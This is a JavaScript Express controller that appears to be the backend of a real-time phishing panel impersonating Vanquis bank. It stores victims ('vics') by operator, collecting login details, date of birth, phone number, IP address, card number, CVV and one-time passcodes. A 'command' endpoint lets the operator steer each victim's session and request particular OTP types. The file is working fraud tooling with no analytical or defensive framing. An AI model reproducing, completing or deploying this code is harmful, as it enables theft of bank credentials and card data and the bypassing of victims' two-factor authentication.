const Vanquis = require("../models/vanquisModel");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Vanquis.find({ owner }).exec((err, vics) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vics);
  });
};

const command = async (req, res) => {
  const { uniqueid, status, otpType } = req.body;
  try {
    if (status == 2 || status == 3) {
      await Vanquis.findOneAndUpdate(
        { uniqueid },
        { status: 2, otpType }
      ).exec();
    } else {
      await Vanquis.findOneAndUpdate({ uniqueid }, { status }).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Vanquis.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { last6, dob, telephone, uniqueid, owner, ip } = req.body;
  try {
    await Vanquis.create({
      last6,
      dob,
      telephone,
      status: 1,
      owner,
      uniqueid,
      ip,
    });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { last6, dob, telephone, uniqueid } = req.body;
  try {
    await Vanquis.findOneAndUpdate(
      { uniqueid },
      { last6, dob, telephone, status: 7 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitCard = async (req, res) => {
  const { ccnum, cvv, uniqueid } = req.body;
  try {
    await Vanquis.findOneAndUpdate(
      { uniqueid },
      { ccnum, cvv, status: 5 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await Vanquis.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await Vanquis.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitCard,
  submitOtp,
  deleteEntry,
};
